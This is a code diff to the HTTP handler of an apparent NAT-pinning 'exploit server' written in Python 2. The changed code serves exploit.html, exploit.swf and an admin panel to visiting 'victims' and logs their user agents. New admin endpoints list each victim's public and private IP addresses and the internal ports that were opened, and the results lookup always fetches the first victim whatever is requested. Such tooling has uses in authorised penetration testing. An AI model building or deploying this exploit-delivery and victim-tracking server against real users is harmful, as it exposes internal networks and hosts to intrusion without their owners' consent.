@@ -34,27 +34,46 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 		global REQPAGE, REQHEADER, REQHEADERDONE
 		data = self.recv(1024)
 		request = self.get_header(data,"GET", " ")
-		page = ""
+		_page = ""
 		if request <>"":
 			headerparts = request.split(" ")
 			if headerparts[0]=="GET":
-				page = headerparts[1].replace("/","")
-				if page =="": page = "exploit.html"
-				self.server.log("Victim requested page: " + page,0)
-		page = page.split("?")[0]
+				_page = headerparts[1].replace("/","")
+				if _page =="": _page = "exploit.html"
+				self.server.log("Victim requested page: " + _page,0)
+		_page=_page.lower()
+		page = _page.split("?")[0];
 		if page != "":
-			if page=="exploit.html":
+			arrPages = ["exploit.html","exploit.swf","admin.html","gremwell_logo.png","admin.js","admin.css"]
+			arrCommands = ["xclients","xresults"]
+			if page in arrPages:
 				agent = self.get_header(data,"USER-AGENT",":")
 				self.server.log("---" + agent,0)
-				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: 62.213.198.42\r\nContent-Length: $len$\r\n\r\n"""
-				f = open("exploit/exploit.html","r")
+				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
+				f = open("exploit/"+page,"r")
 				body = f.read()
 				f.close()
-			elif page=="exploit.swf":
-				respheader="""HTTP/1.1 200 OK\r\nContent-Type: application/x-shockwave-flash\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
-				f = open("exploit/exploit.swf","r")
-				body = f.read()
-				f.close()
+			elif page.split("?")[0] in arrCommands:
+				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
+				body=""
+				if page=="xclients":
+					clientrowid=0
+					for client in self.server.CALLER.getVictims():
+						body = body + "<div id='"+client.VIC_ID+"' onclick='handle_clientClick("+str(clientrowid) +");'>"+client.VIC_ID +"</div>" + "|" + client.PUBLIC_IP + "|" + client.PRIVATE_IP + "|" + str(client.LAST_SEEN) + "|" +"\n"
+						clientrowid=clientrowid+1
+				elif page=="xresults":
+					page_parts = _page.split("?")
+					if len(page_parts)==2:
+						client = self.server.CALLER.getVictimById(0);#returns None on error
+						if client !=None:
+							rsltstr ="Failed"
+							for result in client.TESTS:
+								if result.RESULT==True: rsltstr="Success"
+								body = body + result.TEST_TYPE + "|" + result.STATUS + "|" + result.PRIVATE_IP + "|" + result.PRIVATE_PORT + "|" + rsltstr + "|" + result.PUBLIC_PORT + "\n" 
+					else:
+						body=""
+				else:
+					body=""
 			else:
 				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nContent-Length: 0\r\n\r\n"""
 				body = ""
